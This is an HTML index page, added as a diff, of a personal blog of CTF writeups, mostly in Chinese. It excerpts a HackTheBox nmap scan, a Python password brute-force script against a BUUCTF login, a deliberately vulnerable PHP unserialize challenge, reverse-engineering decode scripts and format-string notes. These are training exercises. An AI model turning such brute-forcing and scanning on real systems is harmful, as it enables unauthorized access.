@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <title>Kur0&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1">
+    <meta name="description" content="">
+    <meta name="generator" content="Hugo 0.144.2">
+    
+    
+    
+      <meta name="robots" content="noindex, nofollow">
+    
+    
+
+    
+<link rel="stylesheet" href="/ananke/css/main.min.css" >
+
+
+
+
+    
+
+    
+      
+
+    
+
+    
+    
+      <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Kur0&#39;s Blog" />
+      <link href="/posts/index.xml" rel="feed" type="application/rss+xml" title="Kur0&#39;s Blog" />
+      
+    
+
+    
+      <link rel="canonical" href="http://localhost:1313/posts/">
+    
+
+    <meta property="og:url" content="http://localhost:1313/posts/">
+  <meta property="og:site_name" content="Kur0&#39;s Blog">
+  <meta property="og:title" content="Posts">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="website">
+
+  <meta itemprop="name" content="Posts">
+  <meta itemprop="datePublished" content="2022-02-11T09:47:03+00:00">
+  <meta itemprop="dateModified" content="2022-02-11T09:47:03+00:00">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Posts">
+
+	
+  </head><body class="ma0 avenir bg-near-white development">
+
+    
+
+  <header>
+    <div class="pb3-m pb6-l bg-black">
+      <nav class="pv3 ph3 ph4-ns" role="navigation">
+  <div class="flex-l justify-between items-center center">
+    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
+      
+        Kur0&#39;s Blog
+      
+    </a>
+    <div class="flex-l items-center">
+      
+
+      
+      <div class="ananke-socials"></div>
+
+    </div>
+  </div>
+</nav>
+
+      <div class="tc-l pv3 ph3 ph4-ns">
+        <h1 class="f2 f-subheadline-l fw2 light-silver mb0 lh-title">
+          Posts
+        </h1>
+        
+      </div>
+    </div>
+  </header>
+
+
+    <main class="pb7" role="main">
+      
+  <article class="pa3 pa4-ns nested-copy-line-height">
+    <section class="cf ph3 ph5-l pv3 pv4-l f4 tc-l center measure-wide lh-copy mid-gray"></section>
+    <section class="flex-ns flex-wrap justify-around mt5">
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/hackthebox-nunchucks-walkthrough/" class="link black dim">
+        HackTheBox Nunchucks Walkthrough
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="enumeration">Enumeration</h1>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ports<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>nmap -p- --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">1000</span> -T4 10.10.11.222 | grep ^<span style="color:#f92672">[</span>0-9<span style="color:#f92672">]</span> | cut -d <span style="color:#e6db74">&#39;/&#39;</span> -f <span style="color:#ae81ff">1</span> | tr <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#e6db74">&#39;,&#39;</span> | sed s/,$//<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ports=22,80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nmap -sC -sV -p$ports 10.10.11.122
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.92 scan initiated Wed Feb  9 22:22:20 2022 as: nmap -sC -sV -p22,80,443 -v -oN nmaplog.txt 10.10.11.122</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.122
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.32s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 6c:14:6d:bb:74:59:c3:78:2e:48:f5:11:d8:5b:47:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> a2:f4:2c:42:74:65:a3:7c:26:dd:49:72:23:82:72:71 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> e1:8d:44:e7:21:6d:7c:13:2f:ea:3b:83:58:aa:02:b3 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http     nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://nunchucks.htb/
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>443/tcp open  ssl/http nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-favicon: Unknown favicon MD5: 4BD6ED13BE03ECBBD7F9FA7BAA036F95
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>|_http-title: Nunchucks - Landing Page
+</span></span><span style="display:flex;"><span>| tls-nextprotoneg: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>nunchucks.htb/organizationName<span style="color:#f92672">=</span>Nunchucks-Certificates/stateOrProvinceName<span style="color:#f92672">=</span>Dorset/countryName<span style="color:#f92672">=</span>UK
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: DNS:localhost, DNS:nunchucks.htb
+</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>Nunchucks-CA/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>| Public Key type: rsa
+</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>| Not valid before: 2021-08-30T15:42:24
+</span></span><span style="display:flex;"><span>| Not valid after:  2031-08-28T15:42:24
+</span></span><span style="display:flex;"><span>| MD5:   57fc 410d e809 1ce6 82f9 7bee 4f39 6fe4
+</span></span><span style="display:flex;"><span>|_SHA-1: 518c 0fd1 <span style="color:#ae81ff">6903</span> 75c0 f26b a6cb e37d 53b8 a3ff 858b
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done 1 IP address (1 host up) scanned in 34.33 seconds</span>
+</span></span></code></pre></div><h2 id="web-application">Web Application</h2>
+<p>修改hosts文件</p>
+    </div>
+    <a href="/posts/hackthebox-nunchucks-walkthrough/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/buuctf-buu-brute-1-writeup/" class="link black dim">
+        BUUCTF - BUU BRUTE 1 Writeup
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p>进入题目url查看，是个登录界面，先输入admin/admin发现提示</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>密码错误，为四位数字。
+</span></span></code></pre></div><p>而且是get请求，结合题目，简单爆破</p>
+<h2 id="crunch生成字典">crunch生成字典</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crunch <span style="color:#ae81ff">4</span> <span style="color:#ae81ff">4</span> -f /usr/share/crunch/charset.lst numeric -o adminpass.txt
+</span></span></code></pre></div><h2 id="爆破脚本">爆破脚本</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding:utf-8 -*-</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;./adminpass.txt&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> payload:
+</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">payload:&#39;</span><span style="color:#f92672">+</span>payload,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>  res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;http://d60d9c19-efe0-4b6a-82c5-0d238a94a44b.node4.buuoj.cn:81/?username=admin&amp;password=&#34;</span><span style="color:#f92672">+</span>payload)
+</span></span><span style="display:flex;"><span>  time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;密码错误&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>    print(res<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>      f<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>      payload <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readline()<span style="color:#f92672">.</span>strip()
+</span></span></code></pre></div><p>payload:6490登录成功。flag{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}</p>
+    </div>
+    <a href="/posts/buuctf-buu-brute-1-writeup/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/buuctf-buu-code-review-1-writeup/" class="link black dim">
+        BUUCTF - BUU CODE REVIEW 1 Writeup
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="打开链接显示代码">打开链接，显示代码</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Created by PhpStorm.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * User: jinzhao
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Date: 2019/10/6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> * Time: 8:04 PM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">BUU</span> {
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> $correct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> $input <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __destruct() {
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">correct</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">uniqid</span>());
+</span></span><span style="display:flex;"><span>           <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">correct</span> <span style="color:#f92672">===</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">input</span>) {
+</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>           }
+</span></span><span style="display:flex;"><span>       } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;pleaseget&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;1&#39;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;pleasepost&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;2&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;md51&#39;</span>]) <span style="color:#f92672">==</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#39;md52&#39;</span>]) <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;md51&#39;</span>] <span style="color:#f92672">!=</span> $_POST[<span style="color:#e6db74">&#39;md52&#39;</span>]) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unserialize</span>($_POST[<span style="color:#e6db74">&#39;obj&#39;</span>]);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj</p>
+    </div>
+    <a href="/posts/buuctf-buu-code-review-1-writeup/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-specialapk/" class="link black dim">
+        蒙古马2020 Wirteups:reverse-specialapk
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p><strong>题目：specialapk</strong></p>
+<p>程序下载:<a href="special_apk.zip">specialapk</a></p>
+<p>jadx查看apk查看MainActivity</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example.easyapk;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.os.Bundle;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.view.View;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Button;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.EditText;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Toast;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> androidx.appcompat.app.AppCompatActivity;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> Button btn;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> c ccc <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> c();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* access modifiers changed from: private */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> EditText edt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> String <span style="color:#a6e22e">a</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">static</span> {
+</span></span><span style="display:flex;"><span>        System.<span style="color:#a6e22e">loadLibrary</span>(<span style="color:#e6db74">&#34;native-lib&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* access modifiers changed from: protected */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span> <span style="color:#75715e">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span>(Bundle savedInstanceState) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span>.<span style="color:#a6e22e">onCreate</span>(savedInstanceState);
+</span></span><span style="display:flex;"><span>        setContentView((<span style="color:#66d9ef">int</span>) R.<span style="color:#a6e22e">layout</span>.<span style="color:#a6e22e">activity_main</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">edt</span> <span style="color:#f92672">=</span> (EditText) findViewById(R.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">flag</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">btn</span> <span style="color:#f92672">=</span> (Button) findViewById(R.<span style="color:#a6e22e">id</span>.<span style="color:#a6e22e">btn</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">setOnClickListener</span>(<span style="color:#66d9ef">new</span> View.<span style="color:#a6e22e">OnClickListener</span>() {
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">/* class com.example.easyapk.MainActivity.AnonymousClass1 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span>(View v) {
+</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">a</span>());
+</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">edt</span>.<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">toString</span>());
+</span></span><span style="display:flex;"><span>                System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">ccc</span>.<span style="color:#a6e22e">cc</span>(MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">edt</span>.<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">toString</span>(), MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">a</span>()));
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">ccc</span>.<span style="color:#a6e22e">cc</span>(MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">edt</span>.<span style="color:#a6e22e">getText</span>().<span style="color:#a6e22e">toString</span>(), MainActivity.<span style="color:#a6e22e">this</span>.<span style="color:#a6e22e">a</span>())) {
+</span></span><span style="display:flex;"><span>                    Toast.<span style="color:#a6e22e">makeText</span>(MainActivity.<span style="color:#a6e22e">this</span>, <span style="color:#e6db74">&#34;正确！&#34;</span>, 0).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>                } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>                    Toast.<span style="color:#a6e22e">makeText</span>(MainActivity.<span style="color:#a6e22e">this</span>, <span style="color:#e6db74">&#34;错误！&#34;</span>, 0).<span style="color:#a6e22e">show</span>();
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>显然，是java+so的套路，输入与native-lib数据做比对，看关键代码</p>
+    </div>
+    <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-specialapk/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-rev/" class="link black dim">
+        蒙古马2020 Wirteups:reverse-rev
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <p><strong>题目：rev</strong></p>
+<p>程序下载:<a href="rev.rar">rev</a></p>
+<blockquote>
+<p>hint:yyyymmdd</p></blockquote>
+<h1 id="0x00-暴力破解压缩包">0x00 暴力破解压缩包</h1>
+<p>根据提示yyyymmdd可知解压密码为8位年份，暴力破解得到解压密码</p>
+<blockquote>
+<p>20200601</p></blockquote>
+<h1 id="0x01-程序分析">0x01 程序分析</h1>
+<p>解压程序看一下：</p>
+<pre tabindex="0"><code>rev.exe: PE32 executable (console) Intel 80386, for MS Windows
+</code></pre><p>我的环境是ubuntu，wine运行发现少两个dll文件，导入运行</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wine rev.exe
+</span></span><span style="display:flex;"><span>please enter the flag:xxx <span style="color:#75715e">#输入xxx</span>
+</span></span><span style="display:flex;"><span>wrong flag!
+</span></span></code></pre></div><p><strong>IDA分析</strong></p>
+<p>看到_main跳转到_main_0，直接跟进F5看伪代码</p>
+<p><img src="ida_main.png" alt="ida_main"></p>
+<p><img src="ida_main_0.png" alt="ida_main_0"></p>
+<p>查看关键function</p>
+<p><img src="ida_base64encode.png" alt="ida_b64encode"></p>
+<p>显然是base64加密，再将加密结果strcpy到Dest上，再经过一道加密算法把Dest的每一byte加j，再与Str2比对。</p>
+<p>看一下Str2的值：</p>
+<p><img src="ida_str2.png" alt="ida_str2"></p>
+<p><strong>注意：</strong> 这里&rsquo;\x84&rsquo;不能被解析所以Str2的长度应为20。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Str2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Znzk^8zuUMLvndT</span><span style="color:#ae81ff">\x84</span><span style="color:#e6db74">vBOP&#39;</span>
+</span></span></code></pre></div><h1 id="0x02-python脚本">0x02 python脚本</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>enc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Znzk^8zuUMLvndT</span><span style="color:#ae81ff">\x84</span><span style="color:#e6db74">vBOP&#39;</span>
+</span></span><span style="display:flex;"><span>tmp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc)):
+</span></span><span style="display:flex;"><span>     tmp<span style="color:#f92672">+=</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(chr(ord(enc[i])<span style="color:#f92672">-</span>i))
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(tmp)
+</span></span><span style="display:flex;"><span>print flag
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./exp.py
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>g00dman
+</span></span></code></pre></div>
+    </div>
+    <a href="/posts/%E8%92%99%E5%8F%A4%E9%A9%AC2020-wirteups-reverse-rev/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/ntu-stcs-2016-w6/" class="link black dim">
+        NTU STCS 2016学习笔记 0x04 Format String
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="format-string">Format String</h1>
+<ul>
+<li><em>在输出火字符串处理函数中用来表示输出的字符串格式</em></li>
+<li><em>在以下的&quot;%s %d&quot;即为format string</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str, a);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fprintf</span>(stderr, <span style="color:#e6db74">&#34;%s %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str, a);
